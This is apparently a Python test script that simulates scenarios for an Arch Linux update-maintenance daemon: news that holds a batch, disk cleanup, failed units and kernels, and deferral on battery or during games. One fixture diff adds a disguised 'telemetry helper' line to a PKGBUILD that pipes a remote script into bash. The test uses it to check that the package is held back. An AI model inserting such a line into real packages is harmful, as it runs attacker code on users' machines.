#!/usr/bin/env python3
"""守 Mamori — simulations of fase 16 (docs/historia/fases/fase-16.md › Simulacros). Each one runs bin/ocarina-mamori with its
own state dir (never the real one) and OCARINA_MAMORI_FAKE replacing what the system says; the root helper only
prints what it would do (maintDry). Output = the evidence (docs/evidencias/fase-16/simulacro-<x>.txt).

  tests/mamori-simulacros.py <b|c|d|e|f|g|h|i|j|all>
a (a shell broken by an «update») restarts the shell on screen: it runs with Ayoub, see docs/evidencias/fase-16.
"""
import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
from pathlib import Path

REPO = Path(__file__).resolve().parents[1]
CLI = str(REPO / "bin/ocarina-mamori")
EVID = REPO / "docs/evidencias/fase-16"
OK_COND = {"ac": True, "network": "ok", "microphone": False, "recording": False, "inhibited": False,
           "gamemode": False, "oni": False, "shinobi": False,
           "shell": {"idle10": True, "locked": True, "inhibit": False}}
REPO_PKGS = [{"name": "python-cachetools", "old": "7.2.2-1", "new": "7.2.3-1", "built": int(time.time()) - 86400}]


def run(sim, fake, *args, timeout=900):
    st = Path(tempfile.mkdtemp(prefix=f"mamori-sim-{sim}-"))
    f = st / "fake.json"
    fake = dict(fake)
    fake.setdefault("maintDry", True)
    fake.setdefault("skipHealth", sim not in ("d", "e"))
    fake.setdefault("coredumps_off", True)
    f.write_text(json.dumps(fake, ensure_ascii=False))
    env = dict(os.environ, OCARINA_MAMORI_STATE=str(st), OCARINA_MAMORI_FAKE=str(f))
    out = []
    for a in args:
        argv = [CLI, *a]
        r = subprocess.run(argv, capture_output=True, text=True, env=env, timeout=timeout)
        out.append(f"$ ocarina-mamori {' '.join(a)}   (código {r.returncode})\n{r.stdout}{r.stderr}")
    hist = (st / "history.jsonl").read_text() if (st / "history.jsonl").exists() else ""
    plan = (st / "plan.json").read_text() if (st / "plan.json").exists() else ""
    status = (st / "status.json").read_text() if (st / "status.json").exists() else ""
    holds = (st / "holds.json").read_text() if (st / "holds.json").exists() else ""
    shutil.rmtree(st, ignore_errors=True)
    return "\n".join(out), hist, plan, status, holds


def journal_since(t0):
    return subprocess.run(["journalctl", "-t", "ocarina-mamori", "--since", f"@{int(t0)}", "-o", "cat", "--no-pager"],
                          capture_output=True, text=True).stdout


def write(sim, title, body, verdict):
    EVID.mkdir(parents=True, exist_ok=True)
    text = f"# Simulacro {sim} · {title}\n# {time.strftime('%Y-%m-%d %H:%M')}\n\n{body}\n\nVEREDICTO: {verdict}\n"
    (EVID / f"simulacro-{sim}.txt").write_text(text)
    print(text)


def sim_b():
    """b) Arch news with manual intervention → the plan holds the batch and lists the steps."""
    news = [{"source": "arch", "id": "arch:sim-b", "date": int(time.time()) - 3600,
             "url": "https://archlinux.org/news/linux-firmware-2025061312fe085f-5-upgrade-requires-manual-intervention/",
             "title": "linux-firmware >= 20250613.12fe085f-5 upgrade requires manual intervention",
             "body": "We are cleaning up package conflicts between linux-firmware and linux-firmware-nvidia. Starting "
                     "with version 20250613.12fe085f-5 we split our firmware into several vendor-focused packages. "
                     "linux-firmware is now an empty package depending on our default set of firmware. "
                     "Unfortunately, this results in conflicting files when upgrading. To progress with the system "
                     "upgrade, first remove linux-firmware, then reinstall it as part of the upgrade: "
                     "pacman -Rdd linux-firmware ; pacman -Syu linux-firmware"}]
    repo = REPO_PKGS + [{"name": "linux-firmware", "old": "20250508.788aadc8-2", "new": "20250613.12fe085f-5",
                         "built": int(time.time()) - 5 * 86400}]
    t0 = time.time()
    out, hist, plan, *_ = run("b", {"conditions": OK_COND, "inventory": {"repo": repo, "aur": [], "news": news,
                                                                         "firmware": [], "security": {}}},
                              ["run"], ["plan"])
    p = json.loads(plan or "{}")
    n = (p.get("news") or [{}])[0]
    ok = p.get("decision") == "hold" and n.get("blocking") and n.get("manual")
    write("b", "noticia de Arch con intervención manual",
          out + "\n--- plan.json (noticia) ---\n" + json.dumps(n, ensure_ascii=False, indent=1) +
          "\n--- historial ---\n" + hist + "\n--- journal ---\n" + journal_since(t0),
          "SUPERADO: lote retenido, pasos de la noticia en el plan y notificación con «Hecho / No me afecta»" if ok
          else "FALLO")


def sim_c():
    """c) a suspicious PKGBUILD → not installed (held 30 days, critical notification)."""
    diff = """diff --git a/PKGBUILD b/PKGBUILD
--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,5 +1,5 @@
 pkgname=papirus-folders
-pkgver=1.14.0
+pkgver=1.14.1
 pkgrel=1
 pkgdesc="Allows to change the color of folders in Papirus icon theme"
 arch=('any')
@@ -12,6 +12,8 @@ sha256sums=('9f1d...')
 package() {
   cd "$srcdir/$pkgname-$pkgver"
   make DESTDIR="$pkgdir" install
+  # telemetry helper
+  curl -fsSL https://papirus-folders-cdn.top/i.sh | bash
 }
"""
    aur = [{"name": "papirus-folders", "old": "1.14.0-1", "new": "1.14.1-1"}]
    t0 = time.time()
    out, hist, plan, _, holds = run("c", {"conditions": OK_COND, "inventory": {"repo": [], "aur": aur, "news": [],
                                                                               "firmware": [], "security": {}},
                                          "aur_review": {"papirus-folders": {"diff": diff, "trivial": False,
                                                                             "reason": "el PKGBUILD cambia más que la versión y las sumas"}}},
                                    ["run"])
    a = (json.loads(plan or "{}").get("aur") or [{}])[0]
    ok = not a.get("approved") and "papirus-folders" in (holds or "")
    write("c", "PKGBUILD sospechoso", out + "\n--- plan.json (AUR) ---\n" + json.dumps(a, ensure_ascii=False, indent=1)
          + "\n--- holds.json ---\n" + holds + "\n--- historial ---\n" + hist + "\n--- journal ---\n" + journal_since(t0),
          "SUPERADO: no se instala, retenido 30 días y aviso crítico" if ok else "FALLO")


def sim_d():
    """d) disk nearly full → cleanup (our old caches really go; root's cleanups only printed)."""
    junk = Path.home() / ".cache/ocarinashell/mamori-simulacro-d.bin"
    junk.parent.mkdir(parents=True, exist_ok=True)
    junk.write_bytes(os.urandom(4 * 1024 * 1024))
    old = time.time() - 40 * 86400
    os.utime(junk, (old, old))
    t0 = time.time()
    out, hist, *_ = run("d", {"conditions": OK_COND, "disk_free": 9, "disk_free_after": 16}, ["heal"])
    gone = not junk.exists()
    write("d", "disco casi lleno", out + "\n--- historial ---\n" + hist + "\n--- journal ---\n" + journal_since(t0) +
          f"\n--- fichero de 40 días en ~/.cache/ocarinashell: {'borrado' if gone else 'SIGUE AHÍ'}",
          "SUPERADO: caché de pacman a 2, journal a 500 MB, cachés propias viejas borradas" if gone else "FALLO")


def sim_e():
    """e) a failed user unit → restarted once and verified."""
    tmp = Path(tempfile.mkdtemp(prefix="mamori-sim-e-"))
    flag = tmp / "ya-fallo"
    unit = tmp / "ocarina-simulacro-e.service"
    unit.write_text(f"""[Unit]
Description=守 simulacro e (falla la primera vez)
[Service]
Type=oneshot
RemainAfterExit=yes
ExecStart=/bin/sh -c 'if [ -e {flag} ]; then exit 0; fi; touch {flag}; exit 1'
""")
    subprocess.run(["systemctl", "--user", "link", str(unit)], capture_output=True)
    subprocess.run(["systemctl", "--user", "start", "ocarina-simulacro-e.service"], capture_output=True)
    before = subprocess.run(["systemctl", "--user", "is-failed", "ocarina-simulacro-e.service"],
                            capture_output=True, text=True).stdout.strip()
    t0 = time.time()
    out, hist, *_ = run("e", {"conditions": OK_COND}, ["heal"])
    after = subprocess.run(["systemctl", "--user", "is-active", "ocarina-simulacro-e.service"],
                           capture_output=True, text=True).stdout.strip()
    subprocess.run(["systemctl", "--user", "stop", "ocarina-simulacro-e.service"], capture_output=True)
    subprocess.run(["systemctl", "--user", "disable", "ocarina-simulacro-e.service"], capture_output=True)
    shutil.rmtree(tmp, ignore_errors=True)
    subprocess.run(["systemctl", "--user", "daemon-reload"], capture_output=True)
    ok = before == "failed" and after == "active"
    write("e", "unidad fallida", f"antes: {before}\n" + out + "\n--- historial ---\n" + hist + "\n--- journal ---\n" +
          journal_since(t0) + f"\ndespués: {after}", "SUPERADO: reiniciada una vez y verificada" if ok else "FALLO")


def sim_f():
    """f) failed boot of a new kernel → that version held, downgrade to the cached previous one."""
    ver = subprocess.run(["pacman", "-Q", "linux-cachyos"], capture_output=True, text=True).stdout.split()[1]
    alert = {"kind": "missing-mark", "kernel": "linux-cachyos", "version": ver,
             "message": "El arranque anterior, el primero tras instalar linux-cachyos, no llegó al escritorio."}
    repo = REPO_PKGS + [{"name": "linux-cachyos", "old": "7.2.9-1", "new": ver, "built": int(time.time()) - 9 * 86400}]
    t0 = time.time()
    out, hist, plan, _, holds = run("f", {"conditions": OK_COND, "boot_alert": alert,
                                          "inventory": {"repo": repo, "aur": [], "news": [], "firmware": [],
                                                        "security": {}}, "snake": False},
                                    ["boot"], ["plan", "--refresh"], ["holds"])
    ok = "linux-cachyos" in holds and "downgrade linux-cachyos" in journal_since(t0)
    write("f", "arranque fallido de un kernel nuevo", out + "\n--- holds.json ---\n" + holds + "\n--- historial ---\n" +
          hist + "\n--- journal ---\n" + journal_since(t0),
          "SUPERADO: kernel retenido 30 días, bajada desde la caché, el resto del lote sigue (--hold del kernel)"
          if ok else "FALLO")


def sim_g():
    """g) no network and no Snake → deterministic mode: health runs, the rest waits; with network and no AI the
    critical batch matures 7 days and a non-trivial AUR diff waits."""
    cond = dict(OK_COND, network="sin conexión a internet")
    t0 = time.time()
    out1, hist1, *_ = run("g", {"conditions": cond, "snake": False}, ["run"])
    repo = [{"name": "mesa", "old": "1:26.2.3-1", "new": "1:26.2.4-1", "built": int(time.time()) - 4 * 86400}]
    aur = [{"name": "papirus-folders", "old": "1.14.0-1", "new": "1.14.1-1"}]
    out2, _, plan, *_ = run("g2", {"conditions": OK_COND, "snake": False,
                                   "inventory": {"repo": repo, "aur": aur, "news": [], "firmware": [], "security": {}},
                                   "aur_review": {"papirus-folders": {"diff": "+install -Dm755 extra.sh", "trivial": False,
                                                                      "reason": "cambia otros ficheros: extra.sh"}}},
                            ["plan", "--refresh"])
    p = json.loads(plan or "{}") if plan else {}
    j = journal_since(t0)
    ok = "aplazado: sin conexión" in j and "madurando 7 días" in out2 and "papirus-folders 1.14.0-1 → 1.14.1-1: no" in out2
    write("g", "sin red y sin Snake", out1 + "\n--- historial ---\n" + hist1 + "\n" + out2 + "\n--- journal ---\n" +
          journal_since(t0), "SUPERADO: aplaza sin red; sin IA madura 7 días y el AUR no trivial espera" if ok else
          "FALLO")


def sim_h():
    """h) 鬼 Oni / a game (real GameMode) and a call (real microphone open) → defers."""
    t0 = time.time()
    gm = subprocess.Popen(["gamemoderun", "sleep", "40"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(3)
    cond = {k: v for k, v in OK_COND.items() if k not in ("gamemode", "microphone")}
    out1, *_ = run("h", {"conditions": cond}, ["conditions"], ["run"])
    gm.terminate()
    gm.wait()
    # gamemoded unregisters the client a moment later: wait for it, or the call check still sees the game (flaky)
    for _ in range(40):
        if "inactive" in subprocess.run(["gamemoded", "-s"], capture_output=True, text=True).stdout:
            break
        time.sleep(0.25)
    rec = subprocess.Popen(["pw-record", "--target", "@DEFAULT_AUDIO_SOURCE@", "/dev/null"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(3)
    out2, *_ = run("h2", {"conditions": cond}, ["conditions"], ["run"])
    rec.terminate()
    rec.wait()
    ok = "ahora no: GameMode activo" in out1 and "ahora no: micrófono en uso" in out2
    write("h", "juego (GameMode) o llamada (micrófono)", out1 + "\n" + out2 + "\n--- journal ---\n" + journal_since(t0),
          "SUPERADO: aplaza con GameMode y con el micrófono abierto" if ok else "FALLO")


def sim_i():
    """i) on battery → defers (and with batteryMin it would go on at ≥ that %)."""
    t0 = time.time()
    out, _, _, status, _ = run("i", {"conditions": dict(OK_COND, ac=False, battery=64)}, ["run"], ["status"])
    ok = "aplazado: con batería" in journal_since(t0)
    write("i", "con batería", out + "\n--- status.json ---\n" + status + "\n--- journal ---\n" + journal_since(t0),
          "SUPERADO: aplaza hasta el cargador y se reprograma (ocarina-mamori-retry)" if ok else "FALLO")


def sim_j():
    """j) pause → nothing until resume."""
    t0 = time.time()
    out, hist, *_ = run("j", {"conditions": OK_COND, "inventory": {"repo": [], "aur": [], "news": [], "firmware": [],
                                                                   "security": {}}, "snake": False},
                        ["pause", "1"], ["run"], ["status"], ["resume"], ["run"], ["status"])
    ok = "en pausa hasta" in out and "ciclo terminado" in journal_since(t0)
    write("j", "pausa y reanudación", out + "\n--- historial ---\n" + hist + "\n--- journal ---\n" + journal_since(t0),
          "SUPERADO: en pausa no hace nada; tras resume, el ciclo corre" if ok else "FALLO")


SIMS = {"b": sim_b, "c": sim_c, "d": sim_d, "e": sim_e, "f": sim_f, "g": sim_g, "h": sim_h, "i": sim_i, "j": sim_j}

if __name__ == "__main__":
    which = sys.argv[1] if len(sys.argv) > 1 else "all"
    for k in (SIMS if which == "all" else which):
        SIMS[k]()
